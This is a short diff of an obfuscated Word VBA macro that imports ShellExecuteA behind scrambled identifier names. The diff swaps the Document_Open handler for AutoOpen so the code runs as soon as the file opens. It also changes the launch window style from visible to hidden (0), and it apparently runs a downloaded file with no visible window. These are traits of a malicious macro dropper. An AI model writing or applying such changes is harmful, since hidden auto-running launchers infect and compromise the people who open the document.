@@ -14,7 +14,7 @@ Alias "ShellExecuteA" (ByVal eyMzmMjiKrJvzYzKEWTqMl As Long, ByVal dYlBQm As Str
 ByVal ZjGBfhNinvlQZZXdA As String, ByVal HOtFFUYcTsHAk As String, ByVal RUpRVk As String, _
 ByVal gPdCCemybuZxPpPbU As Long) As Long
 
-Private Sub Document_Open()
+Sub AutoOpen()
 
 VvXCAiWri
 
@@ -45,6 +45,6 @@ End Sub
 Sub tEJGRjkFGPoU(ByVal yNuATc, b As String)
 
 pznHypDNww 0, yNuATc, b, 0, 0
-DoIT 0, "open", b, "", vbNullString, vbNormalFocus
+DoIT 0, "open", b, "", vbNullString, 0
 
 End Sub
